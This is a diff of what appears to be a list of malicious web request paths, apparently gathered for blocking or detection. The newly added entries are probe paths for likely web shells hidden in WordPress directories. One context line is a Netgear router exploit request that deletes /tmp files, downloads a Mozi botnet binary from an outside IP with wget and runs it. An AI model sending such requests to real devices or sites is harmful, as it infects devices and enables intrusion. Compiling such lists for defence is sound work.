@@ -17381,3 +17381,13 @@ pro.ip-api.com:443
 /wp-includes/class-flitert.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.230.66.53:11342/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /?gad_source=2&gclid=Cj0KCQjwqcO_BhDaARIsACz62vPM0snSd24nvRsCekvDFAALPVAVPnxIFVpEPgnm4fd88u0nYmX-xbUaAuXzEALw_wcB
+/wp-content/upgrade/edit-links.php
+/wp-content/plugins/masterx/wpx.php
+/wp-includes/cqhnpmqs.php
+/.well-known/pki-validation/fond.php
+/.well-known/pki-validation/ibkejxnu.php
+/wp-admin/images/wp-load.php
+/wp-includes/ID3/module.tag.id3v3.php
+/wp-admin/css/colors/coffee/themes.php.hacked
+/wp-admin/maint/src_api.php
+/wp-content/uploads/option.php
